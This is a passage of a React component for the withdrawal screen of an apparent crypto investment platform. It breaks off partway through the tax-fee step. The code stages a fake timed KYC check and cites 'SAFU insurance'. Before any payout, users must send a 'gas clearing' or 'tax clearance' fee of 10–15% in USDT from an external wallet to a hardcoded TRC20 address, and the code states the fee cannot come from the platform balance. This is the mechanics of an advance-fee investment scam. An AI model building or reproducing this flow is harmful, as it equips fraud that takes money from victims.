import { useState, useEffect } from 'react'
import { useAuth } from '../../../context/AuthContext'
import { LOCAL_CURRENCIES } from '../../../data/currencies'
import {
  X,
  ArrowUpRight,
  ShieldCheck,
  ShieldAlert,
  Lock,
  Building2,
  Coins,
  CheckCircle2,
  AlertCircle,
  Copy,
  Check,
  Clock,
  ArrowRight,
  Info,
  DollarSign,
  Landmark,
  Wallet,
  Sparkles,
  Loader2
} from 'lucide-react'

export default function WithdrawModal({ isOpen, onClose, onNavigateKyc }) {
  const { user, requestWithdrawal, platformSettings } = useAuth()

  // Compulsory KYC Verification Check
  const isKycVerified = user?.kycStatus && user.kycStatus.toLowerCase().includes('verified')

  // KYC Stages
  const [kycStage, setKycStage] = useState('CHECKING')

  // Steps:
  // 1: Choose Method (Crypto vs Local Currency)
  // 2A: Crypto Form → 3A: Gas Fee Payment
  // 2B: Local Bank Form → 3B: Tax Fee Payment
  // 4: Confirmation Screen
  const [step, setStep]     = useState(1)
  const [method, setMethod] = useState('CRYPTO')

  // ── Crypto Fields ──────────────────────────────────────────────────────────
  const [cryptoAsset, setCryptoAsset]               = useState('USDT')
  const [cryptoNetwork, setCryptoNetwork]           = useState('TRC20')
  const [destinationWallet, setDestinationWallet]   = useState('')
  const [cryptoFeeHash, setCryptoFeeHash]           = useState('')
  const [cryptoWithdrawAmount, setCryptoWithdrawAmount] = useState('')

  // ── Local Bank Fields ──────────────────────────────────────────────────────
  // Lock currency to whatever the admin approved in the conversion
  const lockedCurrency = user?.approvedConversionCurrency || null
  const [localCurrency, setLocalCurrency]   = useState(lockedCurrency || 'USD')
  const [bankName, setBankName]             = useState('')
  const [accountNumber, setAccountNumber]   = useState('')
  const [accountName, setAccountName]       = useState('')
  const [swiftCode, setSwiftCode]           = useState('')
  const [taxFeeHash, setTaxFeeHash]         = useState('')

  const [copiedFeeWallet, setCopiedFeeWallet] = useState(false)
  const [submitting, setSubmitting]           = useState(false)
  const [feedback, setFeedback]               = useState(null)

  // Trigger KYC check whenever modal opens
  useEffect(() => {
    if (isOpen) {
      setKycStage('CHECKING')
      setStep(1)
      setFeedback(null)

      const timer = setTimeout(() => {
        if (!isKycVerified) {
          setKycStage('UNVERIFIED')
        } else {
          setKycStage('VERIFIED_NOTICE')
          setTimeout(() => setKycStage('CLEARED'), 1200)
        }
      }, 1200)

      return () => clearTimeout(timer)
    }
  }, [isOpen, isKycVerified])

  if (!isOpen) return null

  // ── Balance Calculation ────────────────────────────────────────────────────
  const availableBalance = Number(user?.availableBalance) || 0
  const totalBalance     = Number(user?.totalBalance) ||
    ((Number(user?.capital) || 0) + (Number(user?.profit) || 0) + (Number(user?.availableBalance) || 0))

  // CRYPTO → can withdraw up to totalBalance
  // BANK   → can ONLY withdraw from availableBalance (funded by approved conversion)
  const cryptoMaxAmount = totalBalance
  const bankMaxAmount   = availableBalance

  const numCryptoAmount = Number(cryptoWithdrawAmount) || 0

  // Bank: the amount is always set to the full available balance (max), read-only
  const bankWithdrawAmount = availableBalance

  // External Fee Calculations
  const cryptoGasFeePercent = Number(platformSettings?.cryptoGasFeePercent) || 10
  const cryptoGasFeeMinUsd  = Number(platformSettings?.cryptoGasFeeMinUsd) ?? 25
  const gasClearingFeeUsd   = Math.max(cryptoGasFeeMinUsd, (numCryptoAmount * cryptoGasFeePercent) / 100)
  const gasFeeWallet        = platformSettings?.wallets?.gasClearingWallet || 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a'

  const fiatTaxFeePercent   = Number(platformSettings?.fiatTaxFeePercent) || 15
  const fiatTaxFeeMinUsd    = Number(platformSettings?.fiatTaxFeeMinUsd) ?? 50
  const taxClearanceFeeUsd  = Math.max(fiatTaxFeeMinUsd, (bankWithdrawAmount * fiatTaxFeePercent) / 100)
  const taxFeeWallet        = platformSettings?.wallets?.taxClearanceWallet || 'TJY8B9Wz6E7kRzQx18eNx7yP3gQzLmK29a'

  const selectedFiatObj   = LOCAL_CURRENCIES.find((c) => c.code === localCurrency) || LOCAL_CURRENCIES[0]
  const fiatEquivalentAmount = bankWithdrawAmount * selectedFiatObj.rate

  const handleCopyFeeAddress = (address) => {
    navigator.clipboard.writeText(address)
    setCopiedFeeWallet(true)
    setTimeout(() => setCopiedFeeWallet(false), 2000)
  }

  // ── Crypto Submit ──────────────────────────────────────────────────────────
  const handleProceedCryptoFee = (e) => {
    e.preventDefault()
    setFeedback(null)

    if (!numCryptoAmount || numCryptoAmount <= 0) {
      setFeedback({ type: 'error', message: 'Please enter a valid withdrawal amount.' })
      return
    }

    if (numCryptoAmount > cryptoMaxAmount) {
      setFeedback({
        type: 'error',
        message: `Amount exceeds your total balance ($${cryptoMaxAmount.toLocaleString()}).`
      })
      return
    }

    if (!destinationWallet.trim()) {
      setFeedback({ type: 'error', message: 'Please enter your external destination wallet address.' })
      return
    }

    setStep('3A')
  }

  const handleFinalizeCryptoWithdrawal = (e) => {
    e.preventDefault()
    setFeedback(null)

    if (!cryptoFeeHash.trim()) {
      setFeedback({ type: 'error', message: 'Please provide the transaction hash for the gas fee transfer.' })
      return
    }

    setSubmitting(true)
    setTimeout(() => {
      const res = requestWithdrawal({
        method: 'CRYPTO',
        amount: numCryptoAmount,
        asset: cryptoAsset,
        balanceType: 'total',
        cryptoAddress: destinationWallet.trim(),
        cryptoNetwork,
        gasFeeAmount: gasClearingFeeUsd,
        gasFeeTxHash: cryptoFeeHash.trim()
      })

      setSubmitting(false)
      if (res.success) {
        setStep(4)
      } else {
        setFeedback({ type: 'error', message: res.error || 'Failed to submit withdrawal.' })
      }
    }, 800)
  }

  // ── Bank Submit ────────────────────────────────────────────────────────────
  const handleProceedBankFee = (e) => {
    e.preventDefault()
    setFeedback(null)

    if (bankWithdrawAmount <= 0) {
      setFeedback({
        type: 'error',
        message: 'Your Available Balance is $0. You must first convert your balance and have an admin approve the conversion before you can withdraw to a bank.'
      })
      return
    }

    if (!bankName.trim() || !accountNumber.trim() || !accountName.trim()) {
      setFeedback({ type: 'error', message: 'Please fill in all compulsory bank account details.' })
      return
    }

    setStep('3B')
  }

  const handleFinalizeBankWithdrawal = (e) => {
    e.preventDefault()
    setFeedback(null)

    if (!taxFeeHash.trim()) {
      setFeedback({ type: 'error', message: 'Please provide the transaction hash for the tax clearance fee.' })
      return
    }

    setSubmitting(true)
    setTimeout(() => {
      const res = requestWithdrawal({
        method: 'LOCAL_BANK',
        amount: bankWithdrawAmount,
        asset: localCurrency,
        balanceType: 'available',
        localCurrency,
        bankName: bankName.trim(),
        accountNumber: accountNumber.trim(),
        accountName: accountName.trim(),
        swiftCode: swiftCode.trim(),
        taxFeeAmount: taxClearanceFeeUsd,
        taxFeeTxHash: taxFeeHash.trim()
      })

      setSubmitting(false)
      if (res.success) {
        setStep(4)
      } else {
        setFeedback({ type: 'error', message: res.error || 'Failed to submit withdrawal.' })
      }
    }, 800)
  }

  const handleResetAndClose = () => {
    setKycStage('CHECKING')
    setStep(1)
    setCryptoWithdrawAmount('')
    setDestinationWallet('')
    setCryptoFeeHash('')
    setBankName('')
    setAccountNumber('')
    setAccountName('')
    setSwiftCode('')
    setTaxFeeHash('')
    setFeedback(null)
    onClose()
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-md animate-fade-in">
      <div className="relative w-full max-w-lg bg-[#111111] border border-white/15 rounded-3xl p-6 sm:p-8 shadow-2xl overflow-hidden max-h-[90vh] overflow-y-auto">
        {/* Close Button */}
        <button
          onClick={handleResetAndClose}
          className="absolute top-5 right-5 p-2 text-white/50 hover:text-white rounded-full bg-white/5 hover:bg-white/10 transition-all z-10"
        >
          <X className="w-5 h-5" />
        </button>

        {/* ── CHECKING KYC ─────────────────────────────────────────────── */}
        {kycStage === 'CHECKING' && (
          <div className="text-center py-10 space-y-5 animate-fade-in">
            <div className="w-16 h-16 rounded-2xl bg-[#B0F127]/10 border border-[#B0F127]/30 flex items-center justify-center mx-auto text-[#B0F127]">
              <Loader2 className="w-8 h-8 animate-spin" />
            </div>
            <div className="space-y-2">
              <span className="text-xs font-mono text-[#B0F127] font-semibold uppercase tracking-wider">
                Automated Compliance Scan
              </span>
              <h3 className="text-2xl font-black text-white tracking-tight">Checking KYC Status...</h3>
              <p className="text-xs text-white/50 max-w-sm mx-auto">
                Verifying identity documentation and AML clearance before unlocking withdrawal gateway.
              </p>
            </div>
          </div>
        )}

        {/* ── UNVERIFIED KYC ───────────────────────────────────────────── */}
        {kycStage === 'UNVERIFIED' && (
          <div className="text-center py-6 space-y-6 animate-fade-in">
            <div className="w-16 h-16 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center mx-auto text-amber-400">
              <ShieldAlert className="w-8 h-8" />
            </div>
            <div className="space-y-2">
              <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-amber-500/10 border border-amber-500/20 text-amber-300 text-xs font-semibold">
                <Lock className="w-3.5 h-3.5" />
                Compulsory Security Requirement
              </div>
              <h3 className="text-2xl font-black text-white tracking-tight">
                Complete Your KYC Before Withdrawal
              </h3>
              <p className="text-xs text-white/60 max-w-sm mx-auto leading-relaxed">
                You must complete identity verification (KYC) before initiating any withdrawals.
              </p>
            </div>
            <div className="p-4 bg-black/50 border border-white/10 rounded-2xl text-left space-y-2.5 text-xs font-mono">
              <div className="flex justify-between text-white/60">
                <span>Current KYC Status:</span>
                <span className="text-amber-400 font-bold">{user?.kycStatus || 'Unverified'}</span>
              </div>
              <div className="flex justify-between text-white/60">
                <span>Required Action:</span>
                <span className="text-[#B0F127] font-bold">Submit Identity Documentation</span>
              </div>
            </div>
            <div className="space-y-3 pt-2">
              <button
                type="button"
                onClick={() => { if (onNavigateKyc) { onNavigateKyc() } else { handleResetAndClose() } }}
                className="w-full py-3.5 bg-[#B0F127] hover:bg-[#9ee016] text-black font-bold text-xs rounded-xl transition-all shadow-lg flex items-center justify-center gap-2"
              >
                <ShieldCheck className="w-4 h-4" />
                Complete KYC Verification Now
              </button>
              <button type="button" onClick={handleResetAndClose}
                className="w-full py-2.5 text-xs text-white/50 hover:text-white transition-all font-semibold"
              >
                Cancel & Return
              </button>
            </div>
          </div>
        )}

        {/* ── KYC VERIFIED NOTICE ──────────────────────────────────────── */}
        {kycStage === 'VERIFIED_NOTICE' && (
          <div className="text-center py-10 space-y-5 animate-fade-in">
            <div className="w-16 h-16 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center mx-auto text-emerald-400">
              <CheckCircle2 className="w-8 h-8" />
            </div>
            <div className="space-y-2">
              <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-300 text-xs font-semibold">
                <ShieldCheck className="w-3.5 h-3.5" />
                AML Clearance Approved
              </div>
              <h3 className="text-2xl font-black text-white tracking-tight">KYC Verified</h3>
              <p className="text-xs text-white/60 max-w-sm mx-auto">
                Status: <strong className="text-emerald-400 font-mono">{user?.kycStatus || 'Verified Level 2'}</strong>. Unlocking withdrawal gateway...
              </p>
            </div>
            <button onClick={() => setKycStage('CLEARED')}
              className="px-6 py-2.5 bg-[#B0F127] text-black font-bold text-xs rounded-xl transition-all shadow-md inline-flex items-center gap-2"
            >
              <span>Continue to Withdrawal</span>
              <ArrowRight className="w-3.5 h-3.5" />
            </button>
          </div>
        )}

        {/* ── CLEARED WITHDRAWAL FLOW ──────────────────────────────────── */}
        {kycStage === 'CLEARED' && (
          <>
            {/* ── STEP 1: Choose Withdrawal Method ────────────────────── */}
            {step === 1 && (
              <div className="space-y-6">
                <div>
                  <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-[#B0F127]/10 border border-[#B0F127]/20 text-[#B0F127] text-xs font-semibold mb-2">
                    <ArrowUpRight className="w-3.5 h-3.5" />
                    Institutional Payout Gateway
                  </div>
                  <h3 className="text-xl sm:text-2xl font-black text-white tracking-tight">
                    Select Withdrawal Method
                  </h3>
                  <p className="text-xs text-white/50 mt-1">
                    Choose how you would like to receive your funds.
                  </p>
                </div>

                {/* Balance Summary Card */}
                <div className="p-4 bg-black/50 border border-white/10 rounded-2xl space-y-2 text-xs font-mono">
                  <div className="text-white/50 font-semibold uppercase tracking-wider text-[10px]">Your Balances</div>
                  <div className="flex justify-between text-white/70">
                    <span>Total Balance (Crypto):</span>
                    <span className="text-white font-bold">${totalBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })}</span>
                  </div>
                  <div className="flex justify-between text-white/70">
                    <span>Available Balance (Fiat):</span>
                    <span className={`font-bold ${availableBalance > 0 ? 'text-[#B0F127]' : 'text-white/40'}`}>
                      ${availableBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                    </span>
                  </div>
                </div>

                <div className="grid grid-cols-1 gap-4">
                  {/* Option A: Crypto Withdrawal */}
                  <div
                    onClick={() => { setMethod('CRYPTO'); setStep('2A') }}
                    className="p-5 bg-black/60 hover:bg-black/90 border border-white/10 hover:border-[#B0F127] rounded-2xl cursor-pointer transition-all group flex items-start gap-4"
                  >
                    <div className="w-12 h-12 rounded-xl bg-[#B0F127]/10 border border-[#B0F127]/20 flex items-center justify-center text-[#B0F127] group-hover:scale-105 transition-transform shrink-0">
                      <Coins className="w-6 h-6" />
                    </div>
                    <div className="space-y-1 flex-1">
                      <div className="flex items-center justify-between">
                        <h4 className="text-base font-bold text-white group-hover:text-[#B0F127] transition-colors">
                          Withdraw in Crypto
                        </h4>
                        <span className="text-[10px] text-[#B0F127] font-mono bg-[#B0F127]/10 px-2 py-0.5 rounded">
                          Blockchain Payout
                        </span>
                      </div>
                      <p className="text-xs text-white/60">
                        Withdraw from your <strong className="text-white">total balance</strong> directly to a crypto wallet (USDT, BTC, ETH, SOL).
                      </p>
                      <p className="text-[10px] text-[#B0F127] font-mono">
                        Available: ${totalBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                      </p>
                    </div>
                  </div>

                  {/* Option B: Local Currency Bank Transfer */}
                  <div
                    onClick={() => { setMethod('LOCAL_BANK'); setStep('2B') }}
                    className="p-5 bg-white text-black rounded-2xl cursor-pointer transition-all hover:shadow-[0_0_25px_rgba(255,255,255,0.15)] flex items-start gap-4"
                  >
                    <div className="w-12 h-12 rounded-xl bg-black text-[#B0F127] flex items-center justify-center shrink-0">
                      <Landmark className="w-6 h-6" />
                    </div>
                    <div className="space-y-1 flex-1">
                      <div className="flex items-center justify-between">
                        <h4 className="text-base font-black text-black">
                          Withdraw in Local Currency
                        </h4>
                        <span className="text-[10px] text-black font-mono font-bold bg-black/10 px-2 py-0.5 rounded">
                          Bank Wire / Fiat
                        </span>
                      </div>
                      <p className="text-xs text-black/70">
                        Withdraw your <strong>Available Balance</strong> (funded by an approved conversion) to your bank account in local currency.
                      </p>
                      <p className={`text-[10px] font-mono font-bold ${availableBalance > 0 ? 'text-emerald-600' : 'text-red-500'}`}>
                        Available for bank withdrawal: ${availableBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                        {availableBalance <= 0 && ' — Convert your balance first'}
                      </p>
                    </div>
                  </div>
                </div>

                <div className="p-4 bg-black/40 border border-white/5 rounded-2xl flex items-center gap-3 text-xs text-white/60">
                  <ShieldCheck className="w-5 h-5 text-[#B0F127] shrink-0" />
                  <span>All payouts are backed by Purex Institutional SAFU insurance reserves.</span>
                </div>
              </div>
            )}

            {/* ── STEP 2A: Crypto Withdrawal Details ──────────────────── */}
            {step === '2A' && (
              <div className="space-y-6">
                <div>
                  <div className="flex items-center justify-between">
                    <span className="text-xs text-[#B0F127] font-mono font-semibold uppercase">Step 1 of 2</span>
                    <button type="button" onClick={() => setStep(1)} className="text-xs text-white/50 hover:text-white underline">
                      Change Method
                    </button>
                  </div>
                  <h3 className="text-xl sm:text-2xl font-black text-white tracking-tight mt-1">
                    Crypto Withdrawal Details
                  </h3>
                  <p className="text-xs text-white/50">
                    Withdraw from your total balance to any crypto wallet.
                  </p>
                </div>

                {/* Total Balance Info */}
                <div className="p-3 bg-[#B0F127]/10 border border-[#B0F127]/20 rounded-xl flex items-center gap-2 text-xs">
                  <DollarSign className="w-4 h-4 text-[#B0F127] shrink-0" />
                  <span className="text-white/80">
                    Withdrawing from <strong className="text-[#B0F127]">Total Balance</strong>: ${totalBalance.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                  </span>
                </div>

                <form onSubmit={handleProceedCryptoFee} className="space-y-4">
                  {/* Amount Input */}
                  <div className="space-y-1.5">
                    <div className="flex justify-between text-xs text-white/60">
                      <span>Amount to Withdraw</span>
                      <button
                        type="button"
                        onClick={() => setCryptoWithdrawAmount(cryptoMaxAmount)}
                        className="text-[#B0F127] font-bold"
                      >
                        MAX (${cryptoMaxAmount.toLocaleString()})
                      </button>
                    </div>
                    <div className="relative">
                      <span className="absolute left-4 top-1/2 -translate-y-1/2 text-white/40 font-mono text-lg">$</span>
                      <input
                        type="number"
                        step="any"
                        required
                        placeholder="0.00"
                        value={cryptoWithdrawAmount}
                        onChange={(e) => setCryptoWithdrawAmount(e.target.value)}
                        className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl py-3 pl-8 pr-4 text-white font-mono text-lg outline-none"
                      />
                    </div>
                  </div>

                  {/* Asset & Network */}
                  <div className="grid grid-cols-2 gap-3">
                    <div className="space-y-1">
                      <label className="text-xs text-white/60">Asset</label>
                      <select
                        value={cryptoAsset}
                        onChange={(e) => setCryptoAsset(e.target.value)}
                        className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-3 py-2.5 text-xs text-white outline-none font-mono"
                      >
                        <option value="USDT">USDT (Tether)</option>
                        <option value="BTC">BTC (Bitcoin)</option>
                        <option value="ETH">ETH (Ethereum)</option>
                        <option value="SOL">SOL (Solana)</option>
                      </select>
                    </div>
                    <div className="space-y-1">
                      <label className="text-xs text-white/60">Network</label>
                      <select
                        value={cryptoNetwork}
                        onChange={(e) => setCryptoNetwork(e.target.value)}
                        className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-3 py-2.5 text-xs text-white outline-none font-mono"
                      >
                        <option value="TRC20">TRON (TRC20)</option>
                        <option value="ERC20">Ethereum (ERC20)</option>
                        <option value="BEP20">BNB Smart Chain</option>
                        <option value="BTC">Bitcoin Network</option>
                        <option value="SOL">Solana Network</option>
                      </select>
                    </div>
                  </div>

                  {/* Destination Wallet Address */}
                  <div className="space-y-1.5">
                    <label className="text-xs text-white/60">Your Destination {cryptoAsset} Wallet Address</label>
                    <input
                      type="text"
                      required
                      placeholder={`Enter your ${cryptoAsset} (${cryptoNetwork}) address`}
                      value={destinationWallet}
                      onChange={(e) => setDestinationWallet(e.target.value)}
                      className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-4 py-3 text-xs text-white font-mono placeholder-white/30 outline-none"
                    />
                  </div>

                  {feedback && (
                    <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-xl text-xs text-rose-300 flex items-center gap-2">
                      <AlertCircle className="w-4 h-4 shrink-0" />
                      <span>{feedback.message}</span>
                    </div>
                  )}

                  <button
                    type="submit"
                    className="w-full py-3.5 bg-[#B0F127] hover:bg-[#9ee016] text-black font-bold text-xs rounded-xl transition-all shadow-md flex items-center justify-center gap-2"
                  >
                    <span>Continue to Network Clearance</span>
                    <ArrowRight className="w-4 h-4" />
                  </button>
                </form>
              </div>
            )}

            {/* ── STEP 3A: Crypto Gas Fee Payment ─────────────────────── */}
            {step === '3A' && (
              <div className="space-y-6">
                <div>
                  <span className="text-xs text-[#B0F127] font-mono font-semibold uppercase">Step 2 of 2: External Fee Settlement</span>
                  <h3 className="text-xl sm:text-2xl font-black text-white tracking-tight mt-1">
                    Network Gas & Multi-Sig Clearing Fee
                  </h3>
                  <p className="text-xs text-white/50">
                    To dispatch multi-sig liquidity onto the blockchain, pay the network clearing fee from an external wallet.
                  </p>
                </div>

                {/* Fee Invoice Box */}
                <div className="p-4 bg-black/60 border border-white/10 rounded-2xl text-center space-y-1">
                  <span className="text-xs text-white/50 font-mono block">Required Gas & Liquidity Release Fee ({cryptoGasFeePercent}%)</span>
                  <div className="text-2xl font-black text-[#B0F127] font-mono">
                    ${gasClearingFeeUsd.toLocaleString('en-US', { minimumFractionDigits: 2 })} USDT (TRC20)
                  </div>
                  <span className="text-[11px] text-white/40">
                    Releasing ${numCryptoAmount.toLocaleString()} {cryptoAsset} to {destinationWallet.slice(0, 6)}...{destinationWallet.slice(-4)}
                  </span>
                </div>

                {/* Gas Fee Wallet */}
                <div className="space-y-3">
                  <div className="p-4 bg-black/40 border border-white/10 rounded-2xl flex flex-col sm:flex-row items-center gap-4">
                    <div className="w-24 h-24 bg-white p-2 rounded-xl flex items-center justify-center shrink-0">
                      <img
                        src={`https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${gasFeeWallet}`}
                        alt="Gas Fee QR Code"
                        className="w-full h-full object-contain"
                      />
                    </div>
                    <div className="min-w-0 space-y-2 w-full">
                      <div className="flex justify-between items-center text-xs">
                        <span className="text-white/60 font-medium">Fee Clearing Wallet (TRC20)</span>
                        <span className="text-[10px] text-[#B0F127] font-mono bg-[#B0F127]/10 px-2 py-0.5 rounded">USDT / TRON</span>
                      </div>
                      <div className="p-2.5 bg-black/70 rounded-xl border border-white/10 flex items-center justify-between gap-2">
                        <span className="text-xs font-mono text-white/90 truncate">{gasFeeWallet}</span>
                        <button
                          type="button"
                          onClick={() => handleCopyFeeAddress(gasFeeWallet)}
                          className="p-1.5 bg-[#B0F127] text-black rounded-lg hover:bg-[#9ee016] transition-all shrink-0"
                        >
                          {copiedFeeWallet ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
                        </button>
                      </div>
                    </div>
                  </div>
                  <p className="text-[11px] text-amber-300/80 bg-amber-500/10 border border-amber-500/20 p-2.5 rounded-xl text-center">
                    Note: Gas fee cannot be subtracted from your platform balance. Transfer from an external wallet.
                  </p>
                </div>

                <form onSubmit={handleFinalizeCryptoWithdrawal} className="space-y-4">
                  <div className="space-y-1.5">
                    <label className="text-xs text-white/60">Fee Transfer Transaction Hash (TxID)</label>
                    <input
                      type="text"
                      required
                      placeholder="Paste external transfer TxHash (0x... or Hash ID)"
                      value={cryptoFeeHash}
                      onChange={(e) => setCryptoFeeHash(e.target.value)}
                      className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-4 py-3 text-xs text-white font-mono placeholder-white/30 outline-none"
                    />
                  </div>

                  {feedback && (
                    <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-xl text-xs text-rose-300 flex items-center gap-2">
                      <AlertCircle className="w-4 h-4 shrink-0" />
                      <span>{feedback.message}</span>
                    </div>
                  )}

                  <div className="flex gap-3">
                    <button type="button" onClick={() => setStep('2A')}
                      className="w-1/3 py-3 bg-white/5 hover:bg-white/10 text-white font-semibold text-xs rounded-xl border border-white/10 transition-all"
                    >Back</button>
                    <button type="submit" disabled={submitting}
                      className="w-2/3 py-3 bg-[#B0F127] hover:bg-[#9ee016] text-black font-bold text-xs rounded-xl transition-all shadow-md flex items-center justify-center gap-2 disabled:opacity-50"
                    >
                      {submitting ? 'Verifying Transfer...' : 'I Have Paid Gas Fee'}
                    </button>
                  </div>
                </form>
              </div>
            )}

            {/* ── STEP 2B: Local Currency Bank Details ─────────────────── */}
            {step === '2B' && (
              <div className="space-y-6">
                <div>
                  <div className="flex items-center justify-between">
                    <span className="text-xs text-[#B0F127] font-mono font-semibold uppercase">Step 1 of 2</span>
                    <button type="button" onClick={() => setStep(1)} className="text-xs text-white/50 hover:text-white underline">
                      Change Method
                    </button>
                  </div>
                  <h3 className="text-xl sm:text-2xl font-black text-white tracking-tight mt-1">
                    Local Currency Bank Withdrawal
                  </h3>
                  <p className="text-xs text-white/50">
                    Withdraw your converted available balance to your bank account.
                  </p>
                </div>

                {/* Available Balance Display — always max, read-only */}
                <div className="p-4 bg-black/60 border border-white/10 rounded-2xl space-y-2">
                  <div className="flex justify-between text-xs text-white/50 font-mono">
                    <span>Withdrawal Amount (Available Balance)</span>
                    <span className="flex items-center gap-1 text-amber-400">
                      <Lock className="w-3 h-3" /> Auto-set to Max
                    </span>
                  </div>
                  <div className="text-2xl font-black font-mono text-[#B0F127]">
                    ${bankWithdrawAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                  </div>
                  <p className="text-[10px] text-white/40 font-mono">
                    This is your full available balance from an approved conversion. Bank withdrawals always use the full amount.
                  </p>
                </div>

                {/* Zero Balance Warning */}
                {bankWithdrawAmount <= 0 && (
                  <div className="p-3 bg-amber-500/10 border border-amber-500/30 rounded-xl text-xs text-amber-300 flex items-start gap-2">
                    <AlertCircle className="w-4 h-4 shrink-0 mt-0.5" />
                    <span>
                      Your available balance is <strong>$0.00</strong>. You must first use the <strong>Convert</strong> feature to convert your total balance to local currency and wait for admin approval before you can withdraw to a bank.
                    </span>
                  </div>
                )}

                <form onSubmit={handleProceedBankFee} className="space-y-4">
                  {/* Local Currency Picker — locked to approved conversion currency */}
                  <div className="space-y-1.5">
                    <label className="text-xs text-white/60">Local Currency for Bank Transfer</label>
                    {lockedCurrency ? (
                      <div className="w-full bg-black/60 border border-[#B0F127]/30 rounded-xl px-4 py-3 flex items-center justify-between">
                        <span className="text-sm font-black text-[#B0F127] font-mono">
                          {lockedCurrency}
                        </span>
                        <span className="flex items-center gap-1.5 text-[10px] text-[#B0F127]/70 font-mono">
                          <Lock className="w-3 h-3" />
                          Locked to approved conversion
                        </span>
                      </div>
                    ) : (
                      <select
                        value={localCurrency}
                        onChange={(e) => setLocalCurrency(e.target.value)}
                        className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-4 py-3 text-xs text-white outline-none font-bold"
                      >
                        {LOCAL_CURRENCIES.map((c) => (
                          <option key={c.code} value={c.code}>
                            {c.code} ({c.symbol}) - {c.name} [1 USD ≈ {c.rate} {c.code}]
                          </option>
                        ))}
                      </select>
                    )}
                    {bankWithdrawAmount > 0 && (
                      <div className="text-xs font-mono text-[#B0F127]">
                        ≈ {selectedFiatObj.symbol}{fiatEquivalentAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })} {localCurrency}
                      </div>
                    )}
                  </div>

                  {/* Bank Details */}
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    <div className="space-y-1">
                      <label className="text-xs text-white/60">Bank Name</label>
                      <input
                        type="text"
                        required
                        placeholder="e.g. JPMorgan Chase, Barclays"
                        value={bankName}
                        onChange={(e) => setBankName(e.target.value)}
                        className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-3 py-2.5 text-xs text-white outline-none"
                      />
                    </div>
                    <div className="space-y-1">
                      <label className="text-xs text-white/60">Account Number / IBAN</label>
                      <input
                        type="text"
                        required
                        placeholder="e.g. 0123456789"
                        value={accountNumber}
                        onChange={(e) => setAccountNumber(e.target.value)}
                        className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-3 py-2.5 text-xs text-white outline-none font-mono"
                      />
                    </div>
                    <div className="space-y-1 md:col-span-2">
                      <label className="text-xs text-white/60">Account Holder Name</label>
                      <input
                        type="text"
                        required
                        placeholder="Full Legal Name on Account"
                        value={accountName}
                        onChange={(e) => setAccountName(e.target.value)}
                        className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-3 py-2.5 text-xs text-white outline-none"
                      />
                    </div>
                    <div className="space-y-1 md:col-span-2">
                      <label className="text-xs text-white/60">Swift Code / Routing Number (Optional)</label>
                      <input
                        type="text"
                        placeholder="e.g. CHASUS33"
                        value={swiftCode}
                        onChange={(e) => setSwiftCode(e.target.value)}
                        className="w-full bg-black/60 border border-white/15 focus:border-[#B0F127] rounded-xl px-3 py-2.5 text-xs text-white outline-none font-mono"
                      />
                    </div>
                  </div>

                  {feedback && (
                    <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-xl text-xs text-rose-300 flex items-center gap-2">
                      <AlertCircle className="w-4 h-4 shrink-0" />
                      <span>{feedback.message}</span>
                    </div>
                  )}

                  <button
                    type="submit"
                    className="w-full py-3.5 bg-[#B0F127] hover:bg-[#9ee016] text-black font-bold text-xs rounded-xl transition-all shadow-md flex items-center justify-center gap-2"
                  >
                    <span>Continue to Tax Clearance</span>
                    <ArrowRight className="w-4 h-4" />
                  </button>
                </form>
              </div>
            )}

            {/* ── STEP 3B: Bank Tax Fee Payment ────────────────────────── */}
            {step === '3B' && (
              <div className="space-y-6">
                <div>
                  <span className="text-xs text-[#B0F127] font-mono font-semibold uppercase">Step 2 of 2: Tax Clearance Settlement</span>
                  <h3 className="text-xl sm:text-2xl font-black text-white tracking-tight mt-1">
                    Tax Clearance & Withholding Fee
                  </h3>
                  <p className="text-xs text-white/50">
                    Pay the capital gains tax clearance fee to authorize international fiat banking clearance for {localCurrency}.
                  </p>
                </div>

                {/* Tax Fee Invoice */}
                <div className="p-4 bg-black/60 border border-white/10 rounded-2xl text-center space-y-1">
                  <span className="text-xs text-white/50 font-mono block">Required Tax Clearance Fee ({fiatTaxFeePercent}%)</span>
                  <div className="text-2xl font-black text-[#B0F127] font-mono">
                    ${taxClearanceFeeUsd.toLocaleString('en-US', { minimumFractionDigits: 2 })} USDT (TRC20)
                  </div>
                  <span className="text-[11px] text-white/40">
                    Clearing {selectedFiatObj.symbol}{fiatEquivalentAmount.toLocaleString('en-US', { minimumFractionDigits: 2 })} {localCurrency} to {bankName}
                  </span>
                </div>

                {/* Tax Fee Wallet */}
                <div className="space-y-3">
                  <div className="p-4 bg-black/40 border border-white/10 rounded-2xl flex flex-col sm:flex-row items-center gap-4">
